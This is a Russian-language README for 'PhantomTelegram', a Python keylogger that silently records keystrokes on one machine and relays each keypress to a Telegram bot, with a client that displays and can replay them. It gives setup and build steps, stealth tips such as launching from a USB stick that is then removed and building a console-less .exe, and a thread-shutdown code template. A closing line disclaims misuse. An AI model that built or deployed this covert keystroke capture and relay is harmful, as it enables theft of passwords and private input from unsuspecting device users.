# PhantomTelegram

Два скрипта в папке `logger/` делают всё, что нужно:

- `logger/server.py` — тихо читает нажатия клавиш на исходной машине и шлёт каждое событие в Telegram-бота.
- `logger/client.py` — подключается к тому же боту, показывает входящие нажатия и, по желанию, нажимает те же клавиши на локальной машине.

## Установка
1. **Клонировать репозиторий и зайти в него**
   ```bash
   git clone https://github.com/XeinTDM/PhantomTelegram.git
   cd PhantomTelegram
   ```
2. **(Опционально) создать виртуальное окружение**
   ```bash
   python -m venv .venv
   # Windows
   .venv\\Scripts\\activate
   # Linux/macOS
   source .venv/bin/activate
   ```
3. **Поставить зависимости**
   ```bash
   pip install -r requirements.txt
   ```

## Настройка и запуск сервера (машина-источник)
1. Создайте Telegram-бота через @BotFather и получите **токен**.
2. Узнайте свой **Telegram user ID** (например, через @userinfobot).
3. Создайте файл `.env` в корне и добавьте настройки (файл считывается один раз при старте,
   поэтому сервер можно запустить с флешки и убрать её сразу после запуска — данные уже в памяти):
   ```env
   LOGGER_BOT_TOKEN=ТОКЕН_БОТА_СЕРВЕРА
   LOGGER_TARGET_USER_ID=ВАШ_USER_ID
   ```
4. Запустите сервер: `python logger/server.py`
5. В Telegram напишите вашему боту `/start`. Бот будет присылать каждое нажатие (символ в сообщении = символ нажатия). Командой `/stop` можно остановить скрипт.

## Настройка и запуск клиента (машина-приёмник)
1. Получите **API ID** и **API hash** на https://my.telegram.org.
2. В том же `.env` пропишите параметры клиента:
   ```env
   LOGGER_API_ID=123456             # ваш api_id (int)
   LOGGER_API_HASH=...              # ваш api_hash (str)
   LOGGER_SESSION_PATH=logger/client_session # путь/имя файла сессии Telethon
   LOGGER_SERVER_BOT_USERNAME=myserverbot   # юзернейм сервер-бота без @
   ```
   Если `LOGGER_SESSION_PATH` не существует, клиент спросит номер телефона, код из Telegram и (при необходимости) пароль 2FA через всплывающие окна и запишет файл сессии по указанному пути (по умолчанию рядом с `client.py`).
3. Запустите клиента: `python logger/client.py`
4. В окне клиента убедитесь, что подставился юзернейм бота, и нажмите **Подключиться**. Последние нажатия будут отображаться в окне; галочка **Копировать ввод** (по умолчанию выключена) включает/выключает воспроизведение нажатий локально. Кнопка **Тест** отправляет `/start` боту и помогает убедиться, что он отвечает.

### Сборка .exe
1. Установите PyInstaller (`pip install pyinstaller`).
2. Для сервера:
   ```bash
   pyinstaller --onefile --noconsole logger/server.py
   ```
3. Для клиента (Tk-интерфейс):
   ```bash
   pyinstaller --onefile --noconsole --add-data "logger/client_session*:." logger/client.py
   ```
   Поместите `.env` рядом с собранным .exe или пропишите значения в среде; файл сессии Telethon будет создан по `LOGGER_SESSION_PATH` при первом входе (если оставить значение по умолчанию, PyInstaller ключ `--add-data "logger/client_session*:."` упакует файл сессии рядом с клиентом).

## Корректное завершение без зависаний
Архитектура остановки настроена так, чтобы каждый поток выходил по `stop_event`:

- **Очереди**: `send_queue.get()` всегда вызывается с таймаутом, а при остановке в неё кладётся `None`, чтобы разбудить воркер.
- **Long-polling**: опрашивается в цикле с `timeout` и `long_polling_timeout` по 10 секунд. После `stop_event.set()` цикл не перезапускает polling и выходит.
- **Слушатель клавиатуры**: в обработчике нажатий проверяется `stop_event`, а при завершении вызывается `listener.stop()` и `join(timeout=3)`.
- **Главный цикл**: это `while not stop_event.wait(0.2)`, поэтому Ctrl+C и команда `/stop` быстро пробивают ожидание.
- **Сигнал остановки**: `_request_stop()` ставит флаг и кладёт `None` в очередь, чтобы не было блокировок.
- **join с таймаутом**: на завершении потоки `listener`, `bot_thread` и `sender` ждутся с ограничением (3–5 секунд), чтобы программа гарантированно вернулась в главный поток и завершилась.

Шаблон, если нужно повторить в другой программе:
```python
stop_event = threading.Event()
queue = Queue()

def worker():
    while not stop_event.is_set():
        try:
            item = queue.get(timeout=0.5)
        except Empty:
            continue
        if item is None:
            break
        ...

def long_poll():
    while not stop_event.is_set():
        try:
            bot.polling(none_stop=False, timeout=10, long_polling_timeout=10)
        except Exception:
            if stop_event.is_set():
                break
            time.sleep(3)

def shutdown():
    if stop_event.is_set():
        return
    stop_event.set()
    queue.put(None)  # разбудить worker
    bot.stop_polling()

try:
    ...
    while not stop_event.wait(0.2):
        pass
finally:
    shutdown()
    listener.stop(); listener.join(timeout=3)
    poll_thread.join(timeout=5)
    worker_thread.join(timeout=5)
```

## Зависимости
`requirements.txt` включает только нужное для работы двух скриптов: `pynput`, `pyTelegramBotAPI`, `telethon`, `python-dotenv`.

---
**Внимание.** Используйте инструменты только с явного согласия владельца устройства и в рамках закона. Автор не несёт ответственности за неправомерное применение.
